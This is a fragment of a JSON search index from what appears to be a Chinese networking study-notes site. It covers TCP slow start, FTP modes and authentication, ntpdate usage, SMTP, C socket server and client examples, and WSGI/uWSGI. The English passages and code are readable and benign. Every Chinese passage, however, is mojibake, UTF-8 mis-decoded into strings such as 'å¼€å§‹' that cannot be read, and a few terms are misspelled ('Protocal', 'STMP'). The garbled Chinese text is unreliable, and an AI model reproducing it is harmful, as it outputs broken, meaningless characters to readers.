å¼€å§‹ï¼Œæ¯å½“æ”¶åˆ°ä¸€ä¸ªç¡®è®¤å°±å¢åŠ ä¸€ä¸ª MSSã€‚è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¯è¿‡ä¸€ä¸ª RTTï¼Œå‘é€é€Ÿç‡å°†ä¼šç¿»å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nä½•æ—¶ç»“æŸè¿™ç§æŒ‡æ•°çº§çš„å¢é•¿å‘¢ï¼Ÿ\n å¦‚æœå­˜åœ¨è¶…æ—¶ï¼Œåˆ™ TCP å‘é€æ–¹å°† $$ssthresh$$ï¼ˆâ€œæ…¢å¯åŠ¨é˜ˆå€¼â€ï¼‰è®¾ç½®ä¸º $$cwnd/2$$ï¼Œå°† $$cwnd$$ è®¾ç½®ä¸º 1ï¼Œå¹¶é‡æ–°å¼€å§‹æ…¢å¯åŠ¨è¿‡ç¨‹ã€‚ å½“ $$ssthresh == cwnd$$ æ—¶ï¼Œç»“æŸæ…¢å¯å¹¶ä¸” TCP è½¬ç§»åˆ°æ‹¥å¡é¿å…æ¨¡å¼ï¼› å½“æ£€æµ‹åˆ°ä¸‰ä¸ªå†—ä½™ ACK æ—¶ï¼ŒTCP æ‰§è¡Œä¸€ä¸ªå¿«é€Ÿé‡ä¼ ï¼Œå¹¶ä¸”è¿›å…¥å¿«é€Ÿæ¢å¤æ¨¡å¼ã€‚  å³ç”¨å¦‚ä¸‹çš„ FSM æ¥æè¿°ï¼š\n"},{"id":391,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ftp/","title":"FTP","section":"5.åº”ç”¨å±‚","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.cnblogs.com/luoxn28/p/5585458.html https://en.wikipedia.org/wiki/File_Transfer_Protocol   æ–‡ä»¶ä¼ è¾“åè®® FTP #  æ–‡ä»¶ä¼ è¾“åè®®æœ‰åŸºäº TCP çš„FTPå’ŒåŸºäºUDP çš„ç®€å•æ–‡ä»¶ä¼ è¾“åè®® TFTPï¼Œå®ƒä»¬éƒ½æ˜¯æ–‡ä»¶å…±äº«åè®®ä¸­çš„ä¸€å¤§ç±»ï¼Œå³å¤åˆ¶æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶ç‰¹ç‚¹æ˜¯ï¼šè‹¥è¦å­˜å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå°±å¿…é¡»å…ˆè·å¾—ä¸€ä¸ªæœ¬åœ°çš„æ–‡ä»¶å‰¯æœ¬ã€‚å¦‚æœè¦ä¿®æ”¹æ–‡ä»¶ï¼Œåªèƒ½å¯¹æ–‡ä»¶çš„å‰¯æœ¬è¿›è¡Œä¿®æ”¹ï¼Œç„¶åå†å°†ä¿®æ”¹åçš„æ–‡ä»¶ä¼ å›åˆ°åŸèŠ‚ç‚¹ã€‚\nåŸºæœ¬å·¥ä½œåŸç† #  FTP ä½¿ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ï¼Œä¸€ä¸ª FTP æœåŠ¡å™¨è¿›ç¨‹å¯ä»¥ä¸ºå¤šä¸ªå®¢æˆ·æä¾›æœåŠ¡ã€‚\nFTP æœ‰ä¸¤å¤§ç»„æˆéƒ¨åˆ†ï¼š\n ä¸€ä¸ªä¸»è¿›ç¨‹ï¼Œè´Ÿè´£æ¥å—æ–°çš„è¯·æ±‚ï¼Œå…¶å·¥ä½œæ­¥éª¤å¦‚ä¸‹ï¼š  æ‰“å¼€ä¼—æ‰€å‘¨çŸ¥çš„ 21 ç«¯å£ï¼Œä½¿å®¢æˆ·è¿›è¡Œå¯ä»¥è¿æ¥ä¸Šï¼› ç­‰å¾…å®¢æˆ·è¿›ç¨‹å‘é€è¿æ¥è¯·æ±‚ï¼› å¯åŠ¨ä»å±è¿›ç¨‹å¤„ç†å®¢æˆ·è¿›ç¨‹å‘é€çš„è¿æ¥è¯·æ±‚ï¼Œä»å±è¿›ç¨‹å¤„ç†å®Œè¯·æ±‚åç»“æŸï¼Œä»å±è¿›ç¨‹åœ¨è¿è¡ŒæœŸé—´å¯èƒ½æ ¹æ®éœ€è¦å¯åˆ›å»ºå…¶ä»–ä¸€äº›å­è¿›ç¨‹ï¼› å›åˆ°ç­‰å¾…çŠ¶æ€ï¼Œç»§ç»­æ¥å—å…¶ä»–å®¢æˆ·è¿›ç¨‹å‘èµ·çš„è¯·æ±‚ï¼Œä¸»è¿›ç¨‹ä¸ä»å±è¿›ç¨‹çš„å¤„ç†æ˜¯å¹¶å‘è¿›è¡Œçš„ã€‚   è‹¥å¹²ä¸ªä»å±è¿›ç¨‹ï¼Œè´Ÿè´£å¤„ç†å•ä¸ªè¯·æ±‚ã€‚  FTP æ§åˆ¶è¿æ¥åœ¨æ•´ä¸ªä¼šè¯æœŸé—´éƒ½ä¿æŒæ‰“å¼€ï¼Œåªç”¨æ¥å‘é€è¿æ¥/ä¼ é€è¯·æ±‚ã€‚å½“å®¢æˆ·è¿›ç¨‹å‘æœåŠ¡å™¨å‘é€è¿æ¥è¯·æ±‚æ—¶ï¼Œå¯»æ‰¾è¿æ¥æœåŠ¡å™¨è¿›ç¨‹çš„ç†ŸçŸ¥ç«¯å£ 21ï¼ŒåŒæ—¶è¿˜è¦å‘Šè¯‰æœåŠ¡å™¨è¿›ç¨‹è‡ªå·±çš„å¦ä¸€ä¸ªç«¯å£å·ç ï¼Œç”¨äºå»ºç«‹æ•°æ®ä¼ é€è¿æ¥ã€‚æ¥ç€ï¼ŒæœåŠ¡å™¨è¿›ç¨‹ç”¨è‡ªå·±ä¼ é€æ•°æ®çš„ç†ŸçŸ¥ç«¯å£ 20 ä¸å®¢æˆ·è¿›ç¨‹æ‰€æä¾›çš„ç«¯å£å·ç å»ºç«‹æ•°æ®ä¼ é€è¿æ¥ï¼ŒFTPä½¿ç”¨äº†2ä¸ªä¸åŒçš„ç«¯å£å·ï¼Œæ‰€ä»¥æ•°æ®è¿æ¥å’Œæ§åˆ¶è¿æ¥ä¸ä¼šæ··ä¹±ã€‚\nCommunication and data transfer #  Working Mode #  FTP may run in active or passive mode, which determines how the data connection is established:\n  In active mode, the client starts listening for incoming data connections from the server on port M. It sends the FTP command PORT M to inform the server on which port it is listening. The server then initiates a data channel to the client from its port 20, the FTP server data port.\n  In situations where the client is behind a firewall and unable to accept incoming TCP connections, passive mode may be used.\nIn passive mode, the client uses the control connection to send a PASV command to the server and then receives a server IP address and server port number from the server, which the client then uses to open a data connection from an arbitrary client port to the server IP address and server port number received.\n  åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯éƒ½ä½¿ç”¨ä¸€ä¸ªæœªæ³¨å†Œçš„ä»»æ„ç«¯å£ N è¿æ¥åˆ°æœåŠ¡å™¨çš„ 21 ç«¯å£ï¼Œå¹¶ä¸”ä½¿ç”¨ä»»æ„ç«¯å£è¿æ¥åˆ°æœåŠ¡å™¨ 20 ç«¯å£ã€‚\nResponse #  The server responds over the control connection with three-digit status codes in ASCII with an optional text message.\nFor example, 200 (or 200 OK) means that the last command was successful. The numbers represent the code for the response and the optional text represents a human-readable explanation or request (e.g. Need account for storing file).\nData Representation #  While transferring data over the network, four data representations can be used:\n  ASCII mode: Used for text. Data is converted, if needed, from the sending host\u0026rsquo;s character representation to \u0026ldquo;8-bit ASCII\u0026rdquo; before transmission, and (again, if necessary) to the receiving host\u0026rsquo;s character representation.\nAs a consequence, this mode is inappropriate for files that contain data other than plain text.\n  Image mode (commonly called Binary mode): The sending machine sends each file byte by byte, and the recipient stores the bytestream as it receives it. (Image mode support has been recommended for all implementations of FTP).\n  EBCDIC modeï¼ˆExtended Binary Coded Decimal Interchange Codeï¼‰: Used for plain text between hosts using the EBCDIC character set.\n  Local mode: Allows two computers with identical setups to send data in a proprietary format without the need to convert it to ASCII.\n  Data transfer can be done in any of three modes:\n Stream mode: Data is sent as a continuous stream, relieving FTP from doing any processing. Rather, all processing is left up to TCP. No End-of-file indicator is needed, unless the data is divided into records. Block mode: FTP breaks the data into several blocks (block header, byte count, and data field) and then passes it on to TCP. Compressed mode: Data is compressed using a simple algorithm (usually run-length encoding).  Authentication #   Login\n FTP login uses normal username and password scheme for granting access.\nThe username is sent to the server using the USER command, and the password is sent using the PASS command. This sequence is unencrypted \u0026ldquo;on the wire\u0026rdquo;, so may be vulnerable to a network sniffing attack. If the information provided by the client is accepted by the server, the server will send a greeting to the client and the session will commence. If the server supports it, users may log in without providing login credentials, but the same server may authorize only limited access for such sessions.\n Anonymous FTP\n A host that provides an FTP service may provide anonymous FTP access. Users typically log into the service with an \u0026lsquo;anonymous\u0026rsquo; (lower-case and case-sensitive in some FTP servers) account when prompted for user name. Although users are commonly asked to send their email address instead of a password, no verification is actually performed on the supplied data. Many FTP hosts whose purpose is to provide software updates will allow anonymous logins.\nFTP å‘½ä»¤å’Œåº”ç­” #  å‘½ä»¤å’Œåº”ç­”åœ¨å®¢æˆ·å’ŒæœåŠ¡å™¨çš„æ§åˆ¶è¿æ¥ä¸Šä»¥ NVT ASCII ç å½¢å¼ä¼ é€ã€‚è¿™å°±è¦æ±‚åœ¨æ¯è¡Œç»“å°¾éƒ½è¦è¿”å› CRã€LF å¯¹ï¼ˆä¹Ÿå°±æ˜¯æ¯ä¸ªå‘½ä»¤æˆ–æ¯ä¸ªåº”ç­”ï¼‰ã€‚è¿™äº›å‘½ä»¤éƒ½æ˜¯3æˆ–4ä¸ªå­—èŠ‚çš„å¤§å†™ASCIIå­—ç¬¦ï¼Œå…¶ä¸­ä¸€äº›å¸¦é€‰é¡¹å‚æ•°ã€‚\nä»å®¢æˆ·å‘æœåŠ¡å™¨å‘é€çš„FTPå‘½ä»¤è¶…è¿‡30ç§ã€‚ä¸‹å›¾æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„å‡ ç§å‘½ä»¤ï¼š\nåº”ç­”éƒ½æ˜¯ ASCII ç å½¢å¼çš„3ä½æ•°å­—ï¼Œå¹¶è·Ÿæœ‰æŠ¥æ–‡é€‰é¡¹ã€‚å…¶åŸå› æ˜¯è½¯ä»¶ç³»ç»Ÿéœ€è¦æ ¹æ®æ•°å­—ä»£ç æ¥å†³å®šå¦‚ä½•åº”ç­”ï¼Œè€Œé€‰é¡¹ä¸²æ˜¯é¢å‘äººå·¥å¤„ç†çš„ã€‚ç”±äºå®¢æˆ·é€šå¸¸éƒ½è¦è¾“å‡ºæ•°å­—åº”ç­”å’ŒæŠ¥æ–‡ä¸²ï¼Œä¸€ä¸ªå¯äº¤äº’çš„ç”¨æˆ·å¯ä»¥é€šè¿‡é˜…è¯»æŠ¥æ–‡ä¸²ï¼ˆè€Œä¸å¿…è®°å¿†æ‰€æœ‰æ•°å­—å›ç­”ä»£ç çš„å«ä¹‰ï¼‰æ¥ç¡®å®šåº”ç­”çš„å«ä¹‰ã€‚\n"},{"id":392,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ntp/","title":"Ntp","section":"5.åº”ç”¨å±‚","content":" å­¦ä¹ åœ°å€ï¼š\n https://www.tecmint.com/synchronize-time-with-ntp-in-linux/   NTP #  Protocol #  The Network Time Protocol (NTP) is a protocol used to synchronize computer system clock automatically over a networks. The machine can have the system clock use Coordinated Universal Time (UTC) rather than local time.\nntpdate #  The most common method to sync system time over a network in Linux desktops or servers is by executing the ntpdate command which can set your system time from an NTP time server. In this case, the ntpd daemon must be stopped on the machine where the ntpdate command is issued.\nInstallation:\n$ apt-get install ntpdate Example:\n$ sudo ntpdate 1.ro.pool.ntp.org In order to just query the server and not set the clock and use an unprivileged port to send the packets from, in order to bypass firewalls, issue ntpdate with the below flags:\n$ sudo ntpdate -qu 1.ro.pool.ntp.org Always try to query and sync the time with the closest NTP servers available for your zone. The list of the NTP server pools can be found at the following address: https://www.pool.ntp.org/en/\næ­¤åå¯ä»¥é€šè¿‡ date æŒ‡ä»¤æŸ¥çœ‹ç³»ç»Ÿæ—¶é—´ã€‚\n"},{"id":393,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/smtp/","title":"SMTP","section":"5.åº”ç”¨å±‚","content":" å­¦ä¹ åœ°å€ï¼š\n https://blog.csdn.net/kerry0071/article/details/28604267 http://coolnull.com/3055.html   SMTP åè®® #  ç®€ä»‹ #  SMTP ç§°ä¸ºç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSimple Mail Transfer Protocalï¼‰ï¼Œç›®æ ‡æ˜¯å‘ç”¨æˆ·æä¾›é«˜æ•ˆã€å¯é çš„é‚®ä»¶ä¼ è¾“ã€‚å®ƒçš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯å®ƒèƒ½å¤Ÿåœ¨ä¼ é€ä¸­æ¥åŠ›ä¼ é€é‚®ä»¶ï¼Œå³é‚®ä»¶å¯ä»¥é€šè¿‡ä¸åŒç½‘ç»œä¸Šçš„ä¸»æœºæ¥åŠ›å¼ä¼ é€ã€‚\né€šå¸¸å®ƒå·¥ä½œåœ¨ä¸¤ç§æƒ…å†µä¸‹ï¼š\n é‚®ä»¶ä»å®¢æˆ·æœºä¼ è¾“åˆ°æœåŠ¡å™¨ï¼› ä»æŸä¸€ä¸ªæœåŠ¡å™¨ä¼ è¾“åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨ã€‚  SMTP æ˜¯ä¸€ä¸ªè¯·æ±‚/å“åº”åè®®ï¼Œå®ƒç›‘å¬ 25 å·ç«¯å£ï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·çš„ Mail è¯·æ±‚ï¼Œå¹¶ä¸è¿œç«¯ Mail æœåŠ¡å™¨å»ºç«‹ SMTP è¿æ¥ã€‚\nå·¥ä½œæœºåˆ¶ #  å‘é€ SMTP åœ¨æ¥æ”¶åˆ°ç”¨æˆ·çš„é‚®ä»¶è¯·æ±‚åï¼Œåˆ¤æ–­æ­¤é‚®ä»¶æ˜¯å¦ä¸ºæœ¬åœ°é‚®ä»¶ï¼Œè‹¥æ˜¯ç›´æ¥æŠ•é€åˆ°ç”¨æˆ·çš„é‚®ç®±ï¼Œå¦åˆ™å‘ DNS æŸ¥è¯¢è¿œç«¯é‚®ä»¶æœåŠ¡å™¨çš„ MX è®°å½•ï¼Œå¹¶å»ºç«‹ä¸è¿œç«¯æ¥æ”¶ SMTP ä¹‹é—´çš„ä¸€ä¸ªåŒå‘ä¼ é€é€šé“ï¼Œæ­¤å SMTP å‘½ä»¤ç”±å‘é€ SMTP å‘å‡ºï¼Œç”±æ¥æ”¶ SMTP æ¥æ”¶ï¼Œè€Œåº”ç­”åˆ™åæ–¹å‘ä¼ é€ã€‚ä¸€æ—¦ä¼ é€é€šé“å»ºç«‹ï¼ŒSMTP å‘é€è€…å‘é€ MAIL å‘½ä»¤æŒ‡æ˜é‚®ä»¶å‘é€è€…ã€‚\nå¦‚æœ SMTP æ¥æ”¶è€…å¯ä»¥æ¥æ”¶é‚®ä»¶åˆ™è¿”å› OK åº”ç­”ã€‚SMTP å‘é€è€…å†å‘å‡º RCPT å‘½ä»¤ç¡®è®¤é‚®ä»¶æ˜¯å¦æ¥æ”¶åˆ°ã€‚å¦‚æœ SMTP æ¥æ”¶è€…æ¥æ”¶ï¼Œåˆ™è¿”å› OK åº”ç­”ï¼›å¦‚æœä¸èƒ½æ¥æ”¶åˆ°ï¼Œåˆ™å‘å‡ºæ‹’ç»æ¥æ”¶åº”ç­”ï¼ˆä½†ä¸ä¸­æ­¢æ•´ä¸ªé‚®ä»¶æ“ä½œï¼‰ï¼ŒåŒæ–¹å°†å¦‚æ­¤åå¤å¤šæ¬¡ã€‚å½“æ¥æ”¶è€…æ”¶åˆ°å…¨éƒ¨é‚®ä»¶åä¼šæ¥æ”¶åˆ°ç‰¹åˆ«çš„åºåˆ—ï¼Œå…¥ä¼å“¦æ¥æ”¶è€…æˆåŠŸå¤„ç†äº†é‚®ä»¶ï¼Œåˆ™è¿”å› OK åº”ç­”ã€‚\nè¿æ¥å’Œå‘é€è¿‡ç¨‹ #   å»ºç«‹ TCP è¿æ¥ã€‚ å®¢æˆ·ç«¯å‘é€ HELO å‘½ä»¤ä»¥æ ‡è¯†å‘ä»¶äººè‡ªå·±çš„èº«ä»½ã€‚ å®¢æˆ·ç«¯å‘é€ MAIL å‘½ä»¤ï¼ŒæœåŠ¡å™¨ç«¯ä»¥ OK ä½œä¸ºå“åº”ï¼Œè¡¨ç¤ºå‡†å¤‡æ¥æ”¶ã€‚ å®¢æˆ·ç«¯å‘é€ RCPT å‘½ä»¤ä»¥æ ‡è¯†è¯¥é‚®ä»¶çš„è®¡åˆ’æ¥æ”¶äººï¼Œå¯ä»¥æœ‰å¤šä¸ª RECPT è¡Œï¼ŒæœåŠ¡å™¨ç«¯åˆ™è¡¨ç¤ºæ˜¯å¦æ„¿æ„ä¸ºæ¥æ”¶äººæ¥æ”¶é‚®ä»¶ã€‚ å®¢æˆ·ç«¯å‘é€ DATA å‘½ä»¤ï¼Œå‘é€é‚®ä»¶ï¼Œæœ€åä»¥åªå«æœ‰ . çš„ç‰¹æ®Šè¡Œç»“å°¾ã€‚ å®¢æˆ·ç«¯å‘é€ QUIT å‘½ä»¤ï¼Œç»“æŸæ­¤æ¬¡å‘é€ã€‚  Refrence #    STMP Command: http://www.samlogic.net/articles/smtp-commands-reference.htm\n  STMP Reply Code: https://www.greenend.org.uk/rjk/tech/smtpreplies.html\n  "},{"id":394,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/socket/","title":"Socket","section":"5.åº”ç”¨å±‚","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.geeksforgeeks.org/socket-programming-cc/   Socket Programming #  ä»€ä¹ˆæ˜¯ socket ç¼–ç¨‹ï¼Ÿ\nSocket programming is a way of connecting two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while other socket reaches out to the other to form a connection. Server forms the listener socket while client reaches out to the server.\næœåŠ¡ç«¯ #  ç¤ºä¾‹ä»£ç  #  // Server side C/C++ program to demonstrate Socket programming #include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PORT 8080 int main(int argc, char const *argv[]) { \tint server_fd, new_socket, valread; \tstruct sockaddr_in address; \tint opt = 1; \tint addrlen = sizeof(address); \tchar buffer[1024] = {0}; \tchar *hello = \u0026#34;Hello from server\u0026#34;; \t\t// Creating socket file descriptor \tif ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) \t{ \tperror(\u0026#34;socket failed\u0026#34;); \texit(EXIT_FAILURE); \t} \t\t// Forcefully attaching socket to the port 8080 \tif (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, \u0026amp;opt, sizeof(opt))) \t{ \tperror(\u0026#34;setsockopt\u0026#34;); \texit(EXIT_FAILURE); \t} \taddress.sin_family = AF_INET; \taddress.sin_addr.s_addr = INADDR_ANY; \taddress.sin_port = htons( PORT ); \t\t// Forcefully attaching socket to the port 8080 \tif (bind(server_fd, (struct sockaddr *)\u0026amp;address, sizeof(address)) \u0026lt; 0) \t{ \tperror(\u0026#34;bind failed\u0026#34;); \texit(EXIT_FAILURE); \t} \tif (listen(server_fd, 3) \u0026lt; 0) \t{ \tperror(\u0026#34;listen\u0026#34;); \texit(EXIT_FAILURE); \t} \tif ((new_socket = accept(server_fd, (struct sockaddr *)\u0026amp;address, (socklen_t*)\u0026amp;addrlen))\u0026lt;0) \t{ \tperror(\u0026#34;accept\u0026#34;); \texit(EXIT_FAILURE); \t} \tvalread = read( new_socket , buffer, 1024); \tprintf(\u0026#34;%s\\n\u0026#34;,buffer ); \tsend(new_socket , hello , strlen(hello) , 0 ); \tprintf(\u0026#34;Hello message sent\\n\u0026#34;); \treturn 0; } æ¥å£çš„åˆ›å»º #  int socketfd = socket(domain, type, protocol);   sockfd: socket æè¿°ç¬¦ï¼Œä¸€ä¸ªæ•´æ•°ã€‚\n  domain: æ•´æ•°ï¼Œç½‘ç»œå±‚åŒºåŸŸã€‚æ¯”å¦‚ï¼š\n AF_INET (IPv4 åè®®) AF_INET6 (IPv6 åè®®)    type: äº¤æµæ–¹å¼ï¼Œä¼ è¾“å±‚åè®®ã€‚\n SOCK_STREAM: TCPï¼ˆå¯ä¿¡ï¼Œå»ºç«‹è¿æ¥ï¼‰ SOCK_DGRAM: UDPï¼ˆä¸å¯ä¿¡ï¼Œä¸å»ºç«‹è¿æ¥ï¼‰    protocol: ç½‘ç»œå±‚åè®®çš„å€¼ï¼ˆIPï¼‰ï¼Œè¯¥å€¼é€šå¸¸è®¾ç½®ä¸º 0ï¼Œæ„å‘³æˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„åè®®ã€‚\n  ç»‘å®š #  int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); åˆ›å»ºæ¥å£ä¹‹åï¼Œä¸Šé¢çš„ bind å‡½æ•°ä¼šå°† sockfd è¿™ä¸ªæ¥å£ç»‘å®šåˆ° addr è¿™ä¸ªè‡ªå®šä¹‰æ•°æ®ç»“æ„å¯¹è±¡ä¸­æŒ‡å®šçš„åœ°å€å’Œç«¯å£ã€‚\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­æˆ‘ä»¬ä½¿ç”¨ INADDR_ANY æ¥æŒ‡å®š IP åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬å°†æœåŠ¡ç»‘å®šåˆ°äº†æœ¬åœ°çš„ç«¯å£ã€‚\nç›‘å¬ #  int listen(int sockfd, int backlog); è¯¥è¯­å¥ä»¤æœåŠ¡å™¨æ¥å£å¤„äºè¢«åŠ¨æ¥æ”¶æ¶ˆæ¯çš„æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¼€å§‹ç­‰å¾…å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚\nbacklog å®šä¹‰äº† socket åœ¨è¿æ¥æ—¶ï¼Œè¿æ¥ç­‰å¾…é˜Ÿåˆ—ä¸­å¯ä»¥å¢é•¿åˆ°çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœæœ‰å®¢æˆ·ç«¯åœ¨æœ€å¤§é•¿åº¦æ—¶è¿æ¥åˆ°æœåŠ¡å™¨æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ°ä¸€ä¸ª ECONNREFUSED çš„é”™è¯¯ä¿¡æ¯ã€‚\næ¥æ”¶ #  int new_socket= accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); å®ƒå°† sockfd ç­‰å¾…é˜Ÿåˆ—ä¸­æœ€é å‰çš„è¿æ¥è¯·æ±‚è§£å‹å‡ºæ¥ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ socket è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„æè¿°ç¬¦ã€‚\nåˆ°æ­¤ä¸ºæ­¢ï¼ŒæœåŠ¡å™¨å’Œå’Œå®¢æˆ·ç«¯å·²ç»å»ºç«‹äº†è¿æ¥ï¼Œå¯ä»¥ä¼ é€æ•°æ®ã€‚\nå®¢æˆ·ç«¯ #  ç¤ºä¾‹ä»£ç  #  // Client side C/C++ program to demonstrate Socket programming #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PORT 8080  int main(int argc, char const *argv[]) { \tstruct sockaddr_in address; \tint sock = 0, valread; \tstruct sockaddr_in serv_addr; \tchar *hello = \u0026#34;Hello from client\u0026#34;; \tchar buffer[1024] = {0}; \tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) \t{ \tprintf(\u0026#34;\\nSocket creation error \\n\u0026#34;); \treturn -1; \t}  \tmemset(\u0026amp;serv_addr, \u0026#39;0\u0026#39;, sizeof(serv_addr));  \tserv_addr.sin_family = AF_INET; \tserv_addr.sin_port = htons(PORT); \t\t// Convert IPv4 and IPv6 addresses from text to binary form \tif(inet_pton(AF_INET, \u0026#34;127.0.0.1\u0026#34;, \u0026amp;serv_addr.sin_addr)\u0026lt;=0) \t{ \tprintf(\u0026#34;\\nInvalid address/ Address not supported \\n\u0026#34;); \treturn -1; \t}  \tif (connect(sock, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr)) \u0026lt; 0) \t{ \tprintf(\u0026#34;\\nConnection Failed \\n\u0026#34;); \treturn -1; \t} \tsend(sock , hello , strlen(hello) , 0 ); \tprintf(\u0026#34;Hello message sent\\n\u0026#34;); \tvalread = read( sock , buffer, 1024); \tprintf(\u0026#34;%s\\n\u0026#34;,buffer ); \treturn 0; } æ¥å£çš„åˆ›å»º #  ä¸æœåŠ¡å™¨ç«¯æ¥å£çš„åˆ›å»ºè¿‡ç¨‹ç›¸åŒã€‚\nè¿æ¥çš„å»ºç«‹ #  int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); connect è¿™ä¸ªç³»ç»Ÿå‡½æ•°è°ƒç”¨ï¼Œå°†æè¿°ç¬¦ sockfd ä¸ç”± addr å‚æ•°ç¡®å®šçš„åœ°å€å’Œç«¯å£è¿æ¥èµ·æ¥ã€‚\næ€»ç»“ #  TCP-IP åè®®ä¸‹æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n"},{"id":395,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/uwsgi/","title":"Uwsgi","section":"5.åº”ç”¨å±‚","content":" åœ¨æ­å»º NKCTF ç½‘ç«™çš„æ—¶å€™å­¦ä¹ åˆ°çš„æœ‰å…³ UWSGI çš„çŸ¥è¯†\n WSGIåè®® #  å‡ ä¸ªæ¦‚å¿µï¼š\n WSGIï¼šWeb Server Gateway Interfaceã€‚WSGI ä¸æ˜¯æœåŠ¡å™¨ï¼Œpython æ¨¡å—ï¼Œæ¡†æ¶ï¼ŒAPI æˆ–è€…ä»»ä½•è½¯ä»¶ï¼Œåªæ˜¯ä¸€ç§è§„èŒƒï¼Œæè¿° web server å¦‚ä½•ä¸ web application é€šä¿¡çš„è§„èŒƒã€‚  WSGI server è´Ÿè´£ä»å®¢æˆ·ç«¯æ¥æ”¶è¯·æ±‚ï¼Œå°† request è½¬å‘ç»™ applicationï¼Œå°† application è¿”å›çš„ response è¿”å›ç»™å®¢æˆ·ç«¯ï¼› WSGI application æ¥æ”¶ç”± server è½¬å‘çš„ requestï¼Œå¤„ç†è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†ç»“æœè¿”å›ç»™ serverã€‚application ä¸­å¯ä»¥åŒ…æ‹¬å¤šä¸ªæ ˆå¼çš„ä¸­é—´ä»¶(middlewares)ï¼Œè¿™äº›ä¸­é—´ä»¶éœ€è¦åŒæ—¶å®ç° server ä¸ applicationï¼Œå› æ­¤å¯ä»¥åœ¨ WSGI æœåŠ¡å™¨ä¸ WSGI åº”ç”¨ä¹‹é—´èµ·è°ƒèŠ‚ä½œç”¨ï¼šå¯¹æœåŠ¡å™¨æ¥è¯´ï¼Œä¸­é—´ä»¶æ‰®æ¼”åº”ç”¨ç¨‹åºï¼Œå¯¹åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œä¸­é—´ä»¶æ‰®æ¼”æœåŠ¡å™¨ã€‚   **uwsgiï¼š**ä¸ WSGI ä¸€æ ·æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œæ˜¯ uWSGI æœåŠ¡å™¨çš„ç‹¬å åè®®ï¼Œç”¨äºå®šä¹‰ä¼ è¾“ä¿¡æ¯çš„ç±»å‹ï¼Œæ¯ä¸€ä¸ª uwsgi packet å‰ 4byte ä¸ºä¼ è¾“ä¿¡æ¯ç±»å‹çš„æè¿°ï¼Œä¸WSGIåè®®æ˜¯ä¸¤ç§ä¸œè¥¿ï¼Œæ®è¯´è¯¥åè®®æ˜¯ fcgi åè®®çš„10å€å¿«ã€‚ï¼ˆå¿«é€Ÿé€šç”¨ç½‘å…³æ¥å£ â†’ Fast Common Gateway Interfaceï¼FastCGIï¼‰æ˜¯ä¸€ç§è®©äº¤äº’ç¨‹åºä¸WebæœåŠ¡å™¨é€šä¿¡çš„åè®®ï¼‰ **uWSGIï¼š**æ˜¯ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œå®ç°äº† WSGI åè®®ã€uwsgi åè®®ã€http åè®®ç­‰ã€‚  WSGIåè®®çš„å®ç° #  ä»¥ Django 